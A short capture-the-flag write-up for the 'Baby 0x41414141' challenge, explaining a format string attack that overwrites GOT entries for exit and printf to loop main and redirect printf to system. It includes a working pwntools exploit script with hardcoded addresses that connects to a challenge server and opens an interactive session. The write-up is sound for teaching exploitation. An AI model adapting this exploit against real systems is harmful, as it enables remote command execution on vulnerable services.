# Baby 0x41414141
#### wparks

This problem is a straight forward format string problem. It takes our input,
sprintfs it to a buffer, and calls printf on it. Our exploit will be in two parts.


First, we will overwrite the final call to exit to point earlier in the main, allowing
multiple rounds of format string fun.

Second, we will overwrite the got entry for printf with the address of system,
allowing execution of our input. Later analysis showed there was a print flag function
the whole time, but this way is just as easy.

```python
from pwn import *
from libformatstr import FormatStr
OFFSET = 10
SYSTEM = 0x08048570
EXIT = 0x0804a034
PRINTF = 0x0804a02c
MAIN_GETS = 0x0804876c

#r = remote("localhost", 2015)
r = remote("163.172.176.29", 9035)
print r.recv(1024)

p = FormatStr()
p[EXIT] = MAIN_GETS
p[PRINTF] = SYSTEM
payload = p.payload(10, start_len=70)
raw_input("wait")
r.send(payload +"\n")
#At this point, we have a successful loop back around

r.interactive()

```
